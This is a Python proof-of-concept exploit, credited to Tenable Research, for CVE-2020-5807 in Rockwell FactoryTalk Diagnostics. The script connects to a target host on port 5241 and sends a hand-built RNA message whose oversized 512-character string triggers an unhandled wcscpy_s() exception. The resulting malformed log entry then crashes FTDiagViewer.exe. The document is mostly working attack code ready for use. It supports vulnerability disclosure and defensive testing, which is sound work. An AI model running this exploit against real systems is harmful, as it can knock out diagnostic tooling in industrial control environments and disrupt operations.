##
# Exploit Title: FTDiagViewer Denial of Service
# Date: 12/28/2020
# Exploit Author: Tenable Research
# CVE : CVE-2020-5807
# Advisory: https://www.tenable.com/security/research/tra-2020-71
##

import socket, argparse, struct
import re, random, hexdump

def block(data, pad=False):
  dlen = len(data)
  if (pad and dlen % 4):
    data += b'\x00' * (4 - dlen % 4)
  return struct.pack('<L', len(data))  + data

def rna_msg(hdr, data):
  header = ''
  for k, v in sorted(hdr.items()):
    if v is None: v = ''
    header += '{}={}\x00'.format(k, v)

  msg = b'rna\xF2' + block(header.encode(), True) + block(data)
  return msg

def wstr(s):
  slen = len(s)
  ws = s.encode('utf_16_le') + b'\x00\x00'
  ws = struct.pack('<L', len(ws)) + ws
  return ws
  
def vt_str(s):
   return struct.pack('<H',8) + wstr(s)   

def vt_i4(i):
  return struct.pack('<Hl',3, i)   

def vt_empty():
  return b'\x00\x00\x02\x00\x00\x00\x00\x00\x00' 

def field(name, w, val):
  return wstr(name) + struct.pack('<L', w) + val 
 
def dump(title, data):
  print('[--- %s ---]' % (title))
  hexdump.hexdump(data)


# MAIN
# 
descr  = 'This script attempts to write an event to the FactoryTalk Diagnostic Event Log.'
 
parser = argparse.ArgumentParser(description=descr)
parser.add_argument('host', help='Target host')
parser.add_argument('-p', '--port', type=int, default=5241, help='Target port, default: %(default)s')

args = parser.parse_args()
host      = args.host
port      = args.port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(5)
s.connect((host, port))

hdr = {}
hdr['MSGTYPE'] = 1

data  = struct.pack('<L', 3)
data += wstr('A' * 512)    # unhandled exception caused by wcscpy_s()
data += wstr('MyProvider')
data += wstr('UNK_AAAA')
data += wstr('ATTACKER')
data += wstr('UNK_BBBB')
data += struct.pack('<Q',0x40e5881423f70b3d)
data += struct.pack('<L', 1)
data += struct.pack('<L', 8)
data += struct.pack('<L', 9)
data += struct.pack('<L', 0)
data += b'\x00' * 16 
data += struct.pack('<L', 2)

vlist = []
vlist.append(vt_str('VSTR_AAAA'))
vlist.append(vt_i4(0x1234))
data += struct.pack('<L', len(vlist))
for e in vlist:
  data += e

bs = b'BYTE_STREAM'
data += struct.pack('<L', len(bs))
data += bs

flist = []
flist.append(field('F1', 1, vt_str('F1_VAL')))
flist.append(field('F2', 1, vt_str('F2_VAL')))
flist.append(field('F3', 1, vt_i4(0xabcd)))

data += struct.pack('<L', len(flist))
for e in flist:
  data += e

vt = vt_str('FULL_NAME') 
data += vt

data += struct.pack('<L', 0)

msg = rna_msg(hdr, data)
print('Sending the following to create an entry in FTDiag.evtx.')
dump('msg', msg)
s.sendall(msg)
try:
  res = s.recv(4096)
  dump('res', res)
except: pass
print("Try to run FTDiagViewer.exe on {} with message source set to 'Local Log'.".format(host))
